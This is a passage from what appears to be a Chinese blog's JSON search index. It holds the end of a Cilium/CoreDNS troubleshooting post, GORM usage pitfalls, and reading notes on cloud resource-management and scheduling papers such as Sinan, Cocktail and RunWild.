所有节点执行上面的工作后，coredns终于正常了，而且我尝试部署了测试应用，可以通过网络访问。\n关于为什么这样做请看这条issue：https://github.com/cilium/cilium/pull/20072\n另外，其他信息请查看：https://github.com/cilium/cilium/issues/20498\n","date":"2022-07-15T14:35:19+08:00","permalink":"https://lizonglingo.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1kubernetes%E4%BD%BF%E7%94%A8ciliumcoredns%E5%81%A5%E5%BA%B7%E6%A3%80%E6%9F%A5%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%8E%92%E9%94%99/","title":"记一次Kubernetes使用Cilium，coredns健康检查失败的排错"},{"content":" 详情请查阅gorm文档\n模型定义 通常在定义一个gorm的数据库表模型时，会内嵌gorm.Model类型。\ntype User struct { gorm.Model\t// use gorm.Model Name string } // Model a basic GoLang struct which includes the following fields: ID, CreatedAt, UpdatedAt, DeletedAt // It may be embedded into your model or you may build your own model without it // type User struct { // gorm.Model // } type Model struct { ID uint `gorm:\u0026#34;primarykey\u0026#34;` CreatedAt time.Time UpdatedAt time.Time DeletedAt DeletedAt `gorm:\u0026#34;index\u0026#34;` } 这个结构体中包含了一些基本的定义，如ID、事件发生时间等信息。\n当然我们也可以选择不内嵌该结构，自己去声明这些字段。\ntype User struct { ID uint Name string Email *string Age uint8 Birthday *time.Time MemberNumber sql.NullString ActivatedAt sql.NullTime CreatedAt time.Time UpdatedAt time.Time } 上述代码片段中，需要注意sql.Nullxxx类型的字段。String与sql.NullString类型在处理空值时（如更新、查询等）会有很大不同，所以这里是有坑的，在涉及到空值处理时需要十分的小心。\n关于模型定义的详情参照：https://gorm.io/zh_CN/docs/models.html#embedded_struct\n连接数据库 这里主要注意的有以下几点。\n连接语句的一些参数的使用，如编码格式，解析，安全性等参数。\ndsn := \u0026#34;user:passwd@tcp(127.0.0.1:3306)/dbname?charset=utf8mb4\u0026amp;parseTime=True\u0026amp;loc=Local\u0026#34; 一些数据库连接自定义配置，如日志，字段长度、精度等。\n// 配置日志格式 newLogger := logger.New( log.New(os.Stdout, \u0026#34;\\r\\n\u0026#34;, log.Lshortfile), logger.Config{ SlowThreshold: time.Second, LogLevel: logger.Info, Colorful: true, }, ) // 进行数据库的 配置和连接 db, err := gorm.Open(mysql.Open(dsn), \u0026amp;gorm.Config{ Logger: newLogger, DefaultStringSize: 256, ... }) CRUD Create 通常情况下gorm会自动为我们创建记录的主键，虽然我们并没有显示的指定主键。 如果数据量过大，可以使用分批创建，分批大小可以在创建连接时进行配置。 在创建的节点可以使用Hook执行特定操作。 除了使用结构体、列表进行创建，还可以使用Map创建记录，此外还支持原生的SQL语句 Retrieve 需要注意嵌套查询，使用Preload、Joins进行预加载或是链接，或者滞后填充嵌套数据。 可以使用SQL语句、结构体字段和map处理查询条件。 关于高级的用法请查看文档。 Update 注意零值字段的更新，有坑。 Delete 注意软删除和永久删除。 一些通用的设定 在一些关键的事务操作节点上可以使用Hooks自动执行操作。 多表关联操作 注意多表关联的模型关系。 关于外键的设置，自定义和重写外键。 嵌套查询的预加载和表连接。 删除。 ","date":"2022-07-03T18:46:20+08:00","permalink":"https://lizonglingo.github.io/p/gorm%E7%9A%84%E5%B8%B8%E8%A7%81%E5%9D%91/","title":"gorm的常见坑"},{"content":" 来源：ASPLOS'21 ccf-a\n作者：Cornell University\n正如题目所说，这篇文章主要就是使用机器学习的方法，针对微服务架构的应用进行资源配置，当然是保证QoS的前提下提高资源分配和使用的效率。 利用ML方法帮助调度的决策 面向以容器和虚拟机构建及部署的微服务应用 问题的痛点是什么？或是要解决什么问题？他们的idea有什么值得学习的地方？ 先前的工作 为满足QoS而忽视资源利用率，往往有较高的资源分配上限，把边界划定的很远，虽然是为了更好的满足QoS要求但是牺牲了资源 针对单体系统而没有考虑微服务架构的特点 本文idea 突出QoS、E2E时延\n资源分配突出了一个满足QoS要求，并且多次提到OOM错误\n考虑到微服务架构的层级结构(tier)\n考虑到微服务架构的拓扑图，也就是微服务之间的依赖关系\n提到了微服务中某些排队队列的环节会因为QoS违规导致更长时间的排队等候，进而提出了需要一个较长时间的预测\n具体是什么云环境？应用以什么样的方式部署？ Docker + VM组成的云环境。应用以被打包成Docker镜像然后部署在虚拟机上。\n使用了什么机器学习方法？这个学习解决的是什么问题？ 文章提出了一个“two-stage model”。第一阶段，使用CNN预测下一个时间步的E2E时延，这对精确性提出了很高的要求；第二阶段，使用Boosted Trees预测QoS违规（需要使用CNN模型的输出）。\n第一阶段和第二阶段分别代表了短期和长期的预测结果，以辅助调度的决策。\nCNN卷积神经网络 CNN模型主要用于短期的性能预测。\n具体来说，使用CNN来预测下一个时间窗口的时延分布，是秒级的窗口(默认是5秒)。但是文章发现，预测时延是件很困难的事情，并且随着预测时间的增加，效果不理想。\n因此进一步的，文章将预测策略变为：预测是否出现QoS违规，也就是随后的时间段出现QoS违规的概率。（因为通常将QoS与E2E时延划等号，出现QoS违规相当于E2E时延过长，所以QoS违规给调度决策带来的信息是足够的）\n模型使用到的输入数据 CPU使用信息 内存使用信息（包括常驻内存和缓存） 网络使用信息（如接收和发送的数据包） 这些都是用Docker cgroup的接口收集。\n上一个窗口E2E时延的分布 能够在下一个时间窗口分配的资源信息 模型的预测输出 下一个时间窗口的时延信息，该信息会进一步用于Boosted Tree中 Boosted Tree 增长树模型主要用于长期的性能预测。具体来说，进行一个二分类问题的预测——接下来的资源分配是否会造成QoS违规，通过这个预测来减少未来预期之外的负面影响。\n模型使用到的输入数据 使用到CNN中的预测输出的时延信息 资源分配信息 模型的预测输出 在接下来时间步k中，是否会出现QoS违规现象 系统架构是什么样的？如何分配资源？ 系统架构 中心化的调度器 分布式的节点代理 单独部署的预测服务 系统流程如上图。\n资源分配 系统中资源分配的几种动作如下：\n评估怎么做的？使用了什么应用？ 在本地集群和Google Cloud上面做的实验 使用了微服务benchmark套件DeathStarBench(有论文的这个套件)以及其中的应用Hotel Reservation，Social Network。 使用Docker Swarm进行部署 收集了31302和58499条Hotel和Social Network的数据 实验环境 本地集群：80core CPU/256GB RAM GCE集群：93containers 微服务应用 Hotel Reservation Social Network 做实验时可以参考本文实验设计\n","date":"2022-06-26T15:00:34+08:00","permalink":"https://lizonglingo.github.io/p/sinan-ml-based-and-qos-aware-resource-management-for-cloud-microservices/","title":"Sinan: ML-Based and QoS-Aware Resource Management for Cloud Microservices"},{"content":" 来源：NSDI'22\n推荐阅读！\n摘要 背景 越来越多的ML模型运行在公有云环境下。为这些模型服务的框架能够以最小的延迟提供高度准确的预测，并降低部署成本，这一点至关重要。\n关键点 模型集成可以通过智能地将不同模型并行组合来解决精度差距问题。然而，在运行时动态地选择合适的模型，以以最小的部署成本、低延迟来满足预期的准确性。\n本文工作 提出Cocktail，基于模型集成的成本效益模型服务框架。包含两个关键的组件：\n一个动态模型选择框架，在满足精度和延迟要求的同时，减少了集成中的模型数量。 一个采用分布式主动自动伸缩策略的自适应资源管理（RM，Resource Management）框架，有效地为模型分配资源。RM框架利用瞬态虚拟机实例来降低公共云中的部署成本 同时在AWS EC2实例中实现了一个原型系统，演示了使用各种工作负载的详尽评估。结果显示Cocktail减少了部署花费1.45x，与最先进的模型服务框架相比，减少了2x延迟，并满足高达96%的请求的目标精度。\nIntroduction 背景及问题引出 背景案例：Facebook为用户交互应用程序提供了数万亿的推理请求，如对新提要进行排名，对照片进行分类等。这些应用程序必须在亚毫秒延迟[27、34、35、39、44、83]提供准确的预测，因为它们严重影响用户体验。\n随着许多应用使用ML技术增强其用户体验，这种趋势正在扩大。\n通常这种模型服务运行在云平台上，如一些model-serving框架[6, 28, 60]。\n挑战 由于训练数据以及计算和内存资源紧张[59,65,84]造成的高方差一直是设计高精度和低延迟模型的主要障碍\n不同于单模型推理任务，ensemble learning集成学习可以进一步提高服务精确度。（如，多模型的图片分类任务会提高最终的精确度）\n然而，对于集成，由于每个请求都需要运行大量的模型[27,56]而导致的非常高的资源占用，加剧了公共云的部署成本，并导致延迟的高度变化。\n因此，本文解决的主要问题为：\n⭐集成单一的模型推理服务；\n⭐同时提高模型服务的准确度；\n⭐并最小化部署成本。\n现有技术的不足 对最先进的集成模型服务框架进行分析，存在如下不足：\n在像Clipper[27]这样的框架中使用的集成模型选择策略是静态的，因为它们集成了所有可用的模型，并只专注于最小化准确性损失。这将导致更高的延迟，并进一步扩大资源使用，从而加重部署成本。 现有的集合权重估计[87]计算复杂度高，在实践中仅限于一小部分现成模型。这导致精度损失严重。此外，采用线性集成技术(如模型平均)计算量大[80]，且对大量可用模型不可伸缩，缺少弹性。 现有的集成系统不关注公共云基础设施中的模型部署，没有注意到部署成本和延迟。 对单一模型的资源管理模采用的策略不能直接扩展到集成系统中。 因此，重复之前亟待解决的问题：\n⚠️如何解决集成框架的成本、精度和延迟等复杂优化问题？\n本文工作 Cocktail，首个成本友好、集成多模型的ML服务框架，针对于分类推理任务，有很好的精确度和低延迟表现。\n它使用下面三方面解决框架优化问题：\n提出了一种动态模型选择策略，在满足延迟和精度要求的同时，显著减少了集成中使用的模型数量； 利用分布式自动伸缩策略来减少托管集成模型的延迟可变性和资源消耗； 利用transient VMs技术减少了推理服务部署成本（比传统的虚拟机减少79%-90%的成本）。 Contributions 通过描述集成模型的精度与延迟，我们发现在给定的延迟下谨慎地选择可用模型的子集可以达到目标精度。在Cocktail中利用这一点，设计了一种新颖的动态模型选择策略，在保证准确性的同时大大减少了模型的数量。 关注基于分类的推理，最小化来自多个模型的预测偏差。Cocktail采用了一个pre-class加权多数投票政策，这使得它具有可扩展性，与传统加权平均相比，有效地打破了不同模型之间的联系，从而最大限度地提高了准确性。 集成模型资源需求的变动会导致资源的过度供应，为了最小化资源，我们构建了一个分布式的加权自动伸缩策略，该策略利用重要抽样技术主动地为每个模型分配资源。Cocktail使用transient VMs降低模型在云平台上部署的成本。 使用AWS EC2的CPU和GPU实例，实现了原型系统Cocktail并对不同的请求进行了评估。与最先进的模型服务系统相比，部署成本降低1.4x，精确度提升至96%，延迟减少2x。 同时表明，集成模型的Cocktail，Cocktail可以通过将准确度损失限制在0.6%以内来适应实例故障，对故障容忍性有较大提升。 Background and Motivation 本章结构如下：\n分析现有公有云中的集成模型服务； 指出这些服务存在的问题； 表明Cocktail基于以上问题需要做的改进。 Model Serving in Public Cloud 现有公有云模型服务架构如下：\nApplication层 关注SLO，本文指End2End的响应时间。如Ads服务在100ms、推荐服务可以容忍1000ms。\nModel 层和 Framework 层 部署的如TensorFlow、PyTorch框架。以及提供的不同模型（这里以分类模型为例）：\n根据应用程序类型，最大的模型集成尺寸可以从数十到数百个模型不等。\nCloud 层 以VMs或者Container提供资源隔离和运行环境，基于异构的CPU、GPU实例。\n其中，瞬态实例[69]与传统的VM类似，但可以由云提供商在任何时间通过中断通知撤销。这些资源的供应延迟、实例持久性和模型打包花费直接影响到托管模型服务的延迟和成本。\n本文从模型选择的角度关注于提高准确性和延迟，并从成本的角度考虑实例类型。\nRelated Work 下图为本文工作和先前相关工作的对比：\n1️⃣现有的集成模型案例：\nAzure ML-studio：最初集成了5个模型，现在逐渐扩展到200个模型。 AWS Autogluon：集成了6-12个模型。 用户可以手动选择模型数量规模。\n与它们不同的是，Cocktail的模型选择策略试图在给定延迟的情况下选择合适的集合大小，同时最大化准确性。\n2️⃣云上模型服务：\nInFaas、Clipper 、FrugalML、MArk 、Rafiki、 TF-Serving、 SageMaker、AzureML 、Deep-Studio等。\n3️⃣公有云自动缩放：\n现有相关的资源配置策略能分为两类：\n多路复用不同的实例类型； 基于预测策略的主动资源发放。 Cocktail使用了类似的负荷预测模型，并在模型集合方面以分布式的方式使用自动缩放虚拟机。\nCocktail的自动缩放策略与Swayam[34]的分布式自动缩放策略有相似之处；然而，我们进一步引入了新颖的重要采样技术，以减少未充分利用的模型的过度供应\n引出Cocktail 首先回答两个问题：\n1️⃣如何减少资源占用❓\n通过最小化模型集成数量，减少资源使用。文章通过实验，选取精度前50%的模型进行集成。\n完全集成的模型选择是一种过度的行为，而静态集成则会导致精度的损失。这就需要一个动态的模型选择策略，该策略可以根据模型选择策略的准确性和可伸缩性准确地确定所需的模型数量。\n2️⃣如何减少部署成本❓\n大多数云提供商提供瞬态虚拟机，如Amazon Spot实例[69]、谷歌preemptible VMs[9]和Azure Low-priority VMs[7]，可以降低高达10倍的云计算成本。文章**利用这些瞬态VMs(如spot实例)**来大幅降低部署集成模型框架的成本。\nCocktail整体设计 Cocktail架构如下：\nMaster VM：运行了模型选择算法；1a）来决定将哪些模型集成；1b）被选中的模型加载到缓存中，在相同请求到来时加快响应速度。 Queries：各个请求分派到不同的实例池。 Aggregator：用来处理集成模型的返回结果，使用加权多数投票聚合器返回正确的预测。 为了有效地解决资源管理和可伸缩性的挑战，Cocktail应用多种策略。它维护专用的实例池服务于各个模型，这简化了每个模型的管理和负载平衡开销。\nResource Controller：主要管理实例的增减，通过 4a）4b）基于CPU和GPU的开销进行实例数量的管理。 Load Balancer：将Queries分配给适当的实例，并确保所有获取的实例都被打包到VM中。 Autoscaler：利用 6a）预测策略为实例池中的实例预测请求负载，确保资源不会被过度配置；同时使用 6b）重要性抽样算法，通过计算每个模型池在给定时间间隔内所服务的请求的百分比来估计每个模型的重要性。 动态模型选择策略 目标函数 本文使用一个基于窗口的动态模型选择策略，使用下面描述的两个目标函数：\n目标时减小延迟和花费并最大化准确率。\n$\\mu_{AL}$： latency-accuracy metric $\\mu_c$：cost metric $Acc_{target}$：目标准确度 $Lat_{target}$：目标延迟 $N$：参与集成的模型数量 $inst_cost$： VM实例的花费 $m$：指每个模型 $P_{f_m}$：在单个实例中可以并发执行而不违反延迟指标的推理数量，越大越好 $k$：常量，取决于VM的性能配置 第一个目标函数$O_1$就是满足$Acc_{target}$和$Lat_{target}$时最大化$\\mu_{AL}$。\n为此，初始模型列表在满足$Lat_{target}$的模型中选择，并尝试集成使其满足$Acc_{target}$。\nCocktail会将每个模型的准确性作为正确概率，然后迭代地构建一个模型列表，其中它们执行分类的联合概率在准确性目标内。\n$Acc_{margin}$：为0.2% $Lat_{margin}$：为5ms 第二个目标函数$O_2$是最小化$\\mu_c$。\n该目标调整模型清单的大小，并进一步调整资源采购。因此最大化$P_{f_m}$，最小化$k$。\n对于$N$个模型，每个模型都有一个最小精度，因此选取最小精度前50%的模型，数量为${N\\over2} + 1$。来保证集成模型达到预期精度。结果正确率如下：\n模型选择和加权多数投票策略 为最小化$\\mu_c$，设计了一个模型数量缩减策略，只要有超过${N\\over2}+1$的模型选择同一种结果，如下图：\n资源管理 资源控制器 Resource Controller Resource Types： CPU和GPU实例。GPU实例在打包大量请求执行时是划算的。文章提出自适应打包策略，考虑每个实例的$P_f$ 以及在时间$T$到来的请求数量。只有工作负载匹配$P_f$时，才会将负载分发到对应实例。 Cost-aware Procurement： 在一个完全封装的实例中执行请求的成本决定了每个实例的开销。在扩展实例之前，需要估计将它们与现有实例一起运行的成本。在时间$T$时，基于预测负载$L_p$和运行实例$R_N$，使用cost-aware greedy策略来决定要增加的实例数量。 Load Balancer： 在每个模型池中维护一个请求队列，为增加实例池中实例的利用率，负载均衡器将来自队列的每个请求提交到剩余空闲槽位（free slots）。文章使用预期超时10分钟的间隔，来回收实例池中没有被使用的实例。贪婪地分配请求可以使负载较轻的实例更早地伸缩。 自动伸缩器 Autoscaler 我们需要自动伸缩实例数量，来弹性的满足到来的请求负载。Cocktail能准确预测给定时间间隔内的预期负荷。如果需要，Cocktail增加实例到实例池。每隔10秒对SLO违例进行采样，并根据所有实例的资源利用率聚合为每个池生成额外的实例。捕获由于错误预测而导致的SLO违反。\n预测策略：本文设计了DeepARestimator模型。每个模型有1分钟的定期调度间隔$T_s$，在时间$T+T_p$使用预测负责$L_p$，与当前负载$C_p$进行比较，来决定实例数量$I_n$。其中，$T_p$为新实例的平均启动时间。$T_s$设定为1分钟是考虑到AWS EC2 VMs实例的启动时间。为计算$L_p$，对过去S秒内大小为$W$的相邻窗口的到达率进行采样。使用所有窗口的全局到达率，来预测时间$T$在加减$T_p$时间单元中的$L_p$。$T_p$设置为10分钟，使它有足够的时间来捕捉未来长期的变化。所有这些参数都可以根据系统的需要进行调整。\nImportance Sampling： 在自动伸缩中一个重要的问题是模型选择策略为给定的请求约束动态地确定集合中的模型。**基于预测的负载，为每个模型平等地自动伸缩实例，将固有地导致为未充分使用的模型提供过多的实例。**为了解决这个问题，设计了一个加权自动缩放策略，它基于权重智能地为每个池自动缩放实例。算法如下图：\n自动缩放策略如下：\n权重取决于模型被请求(get_popularity)的频率。权重与每个模型池的伸缩实例(launch_workers)的预测负载相乘。这种方法称为Importance Sampling，因为模型池的大小与它们的受欢迎程度成正比。\n本论文实验做得非常充分！可以作为范本。\n","date":"2022-05-15T21:07:08+08:00","permalink":"https://lizonglingo.github.io/p/cocktail-a-multidimensional-optimization-for-model-serving-in-cloud/","title":"Cocktail: A Multidimensional Optimization for Model Serving in Cloud"},{"content":" 来源：NSDI \u0026lsquo;22\n摘要 背景 精确定预估任务运行时间为有效的任务调度提供遍历。现有的任务调度基于历史数据学习，使用任务历史信息预估新任务。但是，由于部署模式转向快速迭代，快速部署这种方式不再精确。\n本文工作 探索了实时学习任务运行时属性，通过主动采样和调度每个job的部分task，并探究这种方式的可行性和限制。这种方法利用了相同的任务在运行时的相似性。 在Azure上使用了3个生产集群，有不同的特性和任务分配。实验表明本文方法更为精确。同时减少了任务完成时间，相对以前的方法提升了1.28x/1.56x/1.32x。 同时将基于采样的学习拓展到DAG任务的调度中，也取得了比先前基于历史信息更快的任务完成时间。 Introduction 问题背景 集群中大数据任务的调度问题。\n先前工作 较多的基于历史信息的学习算法，基于此进行任务调度。\n这样的方法基于几个设定的前提条件：\n这些job是重复性的，它们会多次执行； 相似job运行时表现出的特性相同。 ⭐但是，先前工作的假设前提是有问题的：\n很多job不是重复性的； 重复性的job每次运行时表现出的特性可能不会相同； 历史作业运行时特征具有相当大的变化。 本文工作 一种方法来在线学习分布式作业的运行时属性，以促进集群作业调度。\nMotivation 基于集群中分布式任务关键信息的检测。\n一个job的空间维度，或者说它包含的许多task信息； job的task(在同一阶段)通常执行相同的代码，并处理大小相似的不同数据。 上述观测到的信息是如何使用的呢？\n首先，某个job的task得到了首先调度，然后基于该task，为其他的task提供调度指导。将这种学习方法称为“SLearn”，即“learning in space”。\n这种方式避免了先前工作——基于历史信息学习进行调度的局限性。\nChallenges of SLearn 预测精确度受到不同task运行时属性的影响； 将job的剩余task延迟到采样任务完成后再调度可能会影响作业的完成时间。 Comprehensive Comparative Study 本文对基于历史的学习（LIT, learning in time）和基于采样的学习（LIS, learning in space）进行综合的分析，提出下述问题：\nLearning in space是否比Learning in time更加精确❓ 如果时，那是否可以提高剩余task的表现，来弥补上述的问题（剩余task需要依赖首先受到调度的task的信息，对前序task采样后再进行调度，影响作业完成时间）❓ 并进行回答\n问题1：通过定量分析，基于三个生产集群的job追踪（两个Google Cluster Trace数据集和一个2Sigma数据集），进行了回答。\n问题2：设计了一个通用的job调度器，基于job运行时预估，去优化性能表现。将不同的预测方案接入调度器，如LIT和LIS。\nContribution 基于三个生产集群追踪数据分析，通过历史表征数据来预测分布式job未来的特性，是不准确和不稳定的。 提出SLearn，使用job的空间维度进行采样，对线上job的运行时属性进行学习。 通过定量、跟踪和实验分析，证明了SLearn可以比基于历史的方案更准确地预测作业的运行时属性。对于2Sigma、Google 2011和Google 2019集群追踪的数据集，预测结果的中值误差均有显著的优化。 在Azure上150个节点的集群实验中发现，对作业任务进行抽样来学习作业运行时属性，虽然延迟了作业剩余任务的调度，但可以通过提高精度来弥补性能损失，减少平均job完成时间。 展示了基于采样的学习可以被拓展到DAG job的调度中，实验表明相对于基于历史的学习策略，基于采样的学习可以缩短作业完成时间。 Background and Related Word 本文的核心点在于预测，那么具体预测什么呢？下图是先前基于历史学习技术进行预测的所做的工作：\n本文的将预测结果用于集群调度，使得调度结果满足SLOs要求。\nSLEARN - Learning in Space 学习模块与调度是解耦的。\n流程概述 在job下发后，预测器首先调度一个样本task，叫做pilot tasks，其产生的数据用于算法去学习job的运行时属性。 学习到的信息被注入集群job调度器，调度器执行多种策略以满足SLOs要求。 SLEARN细节 本文提出的方案可以有效的兼顾job的空间属性。\n下图展示了LIT和LIS的不同：\n简单总结 问题背景：特定的生产集群大数据处理任务的调度问题。\n主要方法：针对基于历史信息预测的调度方法的不足，提出基于时空维度信息预测的调度方法。\n评价指标：job的完成时间，少即使好。\n实验：使用了三个开源生产集群中的Trace数据，在Azure上150个node进行实验。\n","date":"2022-05-14T20:09:49+08:00","permalink":"https://lizonglingo.github.io/p/a-case-for-task-sampling-based-learning-for-cluster-job-scheduling/","title":"A Case for Task Sampling based Learning  for Cluster Job Scheduling"},{"content":" 来源：IEEE CLOUD'21\n作者：IBM\n⭐摘要 问题背景 微服务内部通信的复杂性，必须考虑资源利用、调度策略和请求均衡之间的平衡，以防止跨微服务级联的服务质量下降。\n文章做了什么 提出资源管理系统RunWild，可以控制所有节点涉及到的微服务管理：\n扩缩容 调度 自动的根据指定性能表现的负载和性能平衡优化 统一的持续部署方案 着重强调了协同metrics感知在预测资源使用和制定部署计划中的重要性。\n在IBM云进行实验，以K8s的自动调度为基线，减少P90响应时间11%，增加10%的吞吐率，降低30%的资源使用。\n贡献 扩展的部署框架：适用于K8s的调度框架，用来在资源分配、部署、和运行时来控制部署机制； 通用的建模方法：综合考虑微服务特性、节点的相对独立性、工作负载和全局协同节点状态感知，通过结合聚类和回归技术预测资源使用； 微服务间交互指标：一个称为内聚的指标反映了在同一个节点上放置高度相互通信的微服务的优势； 通过Service Mesh对运行时工作负载进行分区：利用服务网格操作流量路由，用其控制能力来划分工作负载以匹配资源的分配。 ⭐现有技术存在的问题 水平伸缩 超过某个阈值时，实例的增多与性能表现的增长不匹配，正如收益递减定律所解释的那样； 资源过度分配并不会显著增加性能表现； 而资源不足会导致性能下降或者致命错误。 垂直伸缩 K8s虽然可以支持HPA和VPA，但是不能一起工作，同时进行HPA和VPA难免会造成干扰。 此外，复杂的资源依赖，全局的资源调度策略使得伸缩方案受多方面影响。\n文章的动机是识别、描述和管理所有因素和维度，以实现统一的部署解决方案，而不是运行相互干扰的机制。\n部署的三个角度 所部署的服务的实例副本数； 节点上每个实例所得到的资源； 每个实例的网络容量。 然后引出下面4个重要的问题：\n调度所涉及到的策略、资源和具体情景很复杂，要考虑的东西太多； 同一节点上部署的服务可能对资源的争用很敏感； 微服务之间的通信，亲和性等因素会影响到全局的服务性能表现、响应事件及吞吐量，最好的方式是使部署的微服务减少跨节点的通信； 如何将请求负载均衡到不同实例以带来更好的网络表现，虽然Service Mesh能够实现负载的分发，但是难以解决上述问题。 文章列举了一些其他文章做的工作，并对比这些工作解决了上述4个问题中的哪些：\n⭐RunWild RunWild主要解决：决定实例数量，决定在哪个节点放置实例，如何对工作负载进行分区，如何根据众多资源类型和情景优化部署？\n涉及到的技术有：\n用循环执行的监控-分析系统对部署进行分析：根据监控和分析环节，设计一个资源使用模型，来预测资源使用。利用automated AI技术获得优化的回归模型来预测资源使用，同时考虑消息请求和节点上资源竞争产生的扰动因素。 根据分析制定部署计划：定义一个聚合指标，表示微服务间(通信)的联系程度。部署计划应用于所有机器，包括水平部署、资源分配、放置调度和负载均衡。 执行部署：利用Service Mesh提供的运行时链路控制，通过标签动态将工作负载进行分区。 系统架构 Management Module 接收用户提交的部署细节信息。\nSpecification Handler：管理输入的部署文件并自动化处理； Reconcile Timer：计算并触发每个输入规范的部署自动化过程。 Computation Module 在全周期中给出部署的解决方案。\nMonitor：监控每个实例的资源使用情况和工作负载，文章将工作负载理解为请求的数量； Modeler：用来预测资源使用的模型； Planner：计算部署计划，包括实例数量、节点放置策略、资源预留、工作负载分区。 Execution Module 用来执行计算的部署结果。\nScaler：更新实例数量； Scheduler：将容器放置到计划的节点； Partitioner：配置链路控制机制，对工作负载进行计划的分区。 系统实现 ⭐实验测试 集群包含8个节点，每个节点4vCPU，16GB内存，并部署了Istio和Prometheus。\n部署70个微服务，600个容器实例，收集了3天的数据。\n","date":"2022-04-24T15:17:07+08:00","permalink":"https://lizonglingo.github.io/p/runwild-resource-management-system-with-generalized-modeling-for-microservices-on-cloud/","title":"RunWild: Resource Management System with Generalized Modeling for Microservices on Cloud"},{"content":" 本篇整理自IEEE CLOUD'21会议中的文章，主题为云背景下的资源管理。\nRunWild: Resource Management System withGeneralized Modeling for Microservices on Cloud ⭐摘要 问题背景 微服务内部通信的复杂性，必须考虑资源利用、调度策略和请求均衡之间的平衡，以防止跨微服务级联的服务质量下降。\n文章做了什么 提出资源管理系统RunWild，可以控制所有节点涉及到的微服务管理：\n扩缩容 调度 自动的根据指定性能表现的负载和性能平衡优化 统一的持续部署方案 着重强调了协同metrics感知在预测资源使用和制定部署计划中的重要性。\n在IBM云进行实验，以K8s的自动调度为基线，减少P90响应时间11%，增加10%的吞吐率，降低30%的资源使用。\n贡献 扩展的部署框架：适用于K8s的调度框架，用来在资源分配、部署、和运行时来控制部署机制； 通用的建模方法：综合考虑微服务特性、节点的相对独立性、工作负载和全局协同节点状态感知，通过结合聚类和回归技术预测资源使用； 微服务间交互指标：一个称为内聚的指标反映了在同一个节点上放置高度相互通信的微服务的优势； 通过Service Mesh对运行时工作负载进行分区：利用服务网格操作流量路由，用其控制能力来划分工作负载以匹配资源的分配。 ⭐现有技术存在的问题 水平伸缩 超过某个阈值时，实例的增多与性能表现的增长不匹配，正如收益递减定律所解释的那样； 资源过度分配并不会显著增加性能表现； 而资源不足会导致性能下降或者致命错误。 垂直伸缩 K8s虽然可以支持HPA和VPA，但是不能一起工作，同时进行HPA和VPA难免会造成干扰。 此外，复杂的资源依赖，全局的资源调度策略使得伸缩方案受多方面影响。\n文章的动机是识别、描述和管理所有因素和维度，以实现统一的部署解决方案，而不是运行相互干扰的机制。\n部署的三个角度 所部署的服务的实例副本数； 节点上每个实例所得到的资源； 每个实例的网络容量。 然后引出下面4个重要的问题：\n调度所涉及到的策略、资源和具体情景很复杂，要考虑的东西太多； 同一节点上部署的服务可能对资源的争用很敏感； 微服务之间的通信，亲和性等因素会影响到全局的服务性能表现、响应事件及吞吐量，最好的方式是使部署的微服务减少跨节点的通信； 如何将请求负载均衡到不同实例以带来更好的网络表现，虽然Service Mesh能够实现负载的分发，但是难以解决上述问题。 文章列举了一些其他文章做的工作，并对比这些工作解决了上述4个问题中的哪些：\n该文会精读，请关注最新的文章。\nFast and Efficient Performance Tuning of Microservices ⭐摘要 针对使用容器部署的微服务架构应用，以Kubernetes、Docker Swarm容器管理平台为依托。在应用正式部署上线之前，也就是在pre-deployment阶段，迭代的根据资源使用相关指标，结合类多目标优化算法(文章称为heuristic optimization algorithm)对资源分配进行调优。\n⭐系统架构 将应用部署到云平台； 进行负载注入； 基于Jaeger的监控系统开始进行性能测试和追踪(对每个微服务)，收集数据，如响应时间和资源的使用量； 通过Jaeger解析服务调用序列； 由Tuning Agent参照服务序列信息、不同类别请求的响应时间和平均资源使用进行调优； Tuning Agent预估每个微服务的新的CPU配额信息； 将这些信息存储到Tuning数据库中； 编排器根据这些信息对服务进行迭代部署。 ⭐测量、优化的依赖指标 需要对服务进行请求的注入来进行测量，主要指标是服务响应时间。涉及到链路追踪、性能监控。\n⭐调优模型抽象 小背景、前提和假设 应用需要一些特定的工作负载$W$，这些工作负载发生在特定的情境，例如在线商城的Black Friday。因此，调优过程可以对其他感兴趣的工作负载重放，从而产生一系列特定于工作负载的配置，可以在部署应用程序时适当地使用。 本文重点关注CPU资源的限制，但是该模型可以拓展到其他资源。 应用包含**$K$个微服务**，每个微服务运行在自己的container中。 每个应用支持**$C$种不同的请求类别**。 每个请求类别**$c$关联到不同的响应时间$T_c$**。 每类请求**$c$涉及到一个微服务调用序列$S_c$**。 因此这个序列中每个微服务$k$都涉及到一个CPU需求。 主机上对应的服务$k$所需的CPU配额表示为$\\alpha_k$。 资源分配问题抽象 问题可以抽象为：在满足响应时间的需求下，求解对每个微服务CPU配额的最小值。\n目标为最小化CPU配额； 需要满足前提条件，即：资源配额能够使某类请求的响应时间$R_c$小于等于目标值$T_c$； 其中响应时间$R_c$是工作负载$W$和对$K$个服务CPU配额的函数； 最后限制CPU需求总额是有限的。 ⭐应用案例及实验 使用的微服务案例Bookstore。\n⭐我的问题 工作负载的模拟具体如何实现？\n有哪些开源微服务应用真正可用又具有一定的代表性？\nSkynet: Performance-driven Resource Management for Dynamic Workloads ⭐摘要 问题背景和主要矛盾 云环境下，资源利用率和应用的性能表现之间的矛盾。\n难点 用户常会分配过多的资源 应用的多样性和动态性，工作负载的动态性及难以预测性 性能表现取决于多种不同资源 文章做了什么，怎么做的 提出Skynet，针对上述三个难点，可以自动对云资源进行管理。\n评估资源需求依赖的指标：Skynet使用performance level objectives(PLOs)准确捕捉用户对所需性能的意图，将用户从资源分配循环中解放。Skynet通过目标PLO去预估资源需求，使用Poportional Integral Derivative(PID)控制器对每个应用调整对应的参数。\n资源需求计算、分配、调度方法：为捕获每个应用对不同资源依赖，Skynet扩展了传统的一维PID控制器(传统的单输入单输出)，实现对CPU、内存、I/O和网络吞吐的预估。Skynet建立一个动态模型，对于每个应用，将目标PLOs映射到资源，同时考虑多种资源和变化的输入负载。事实上，Skynet处于一个动态循环控制来预估资源。\n实现和评估：在kubernetes中将skynetas实现为端到端的定制调度程序，并在5个节点的私有集群和60个裸金属服务器AWS上使用真实的工作负载对其进行评估。以K8s为基线，PLO违规降低7.4倍，资源利用提高两倍。\n⭐系统架构 用户可以指定PLOs，明确对吞吐量、延迟、处理时间等指标的需求。Skynet根据这些PLOs，使用PID[41]预估每个应用的资源需求量。动态的将PLO映射到资源需求，这样一来可以让Skynet适应变化的工作负载和每个应用不同的生命阶段。\n示例 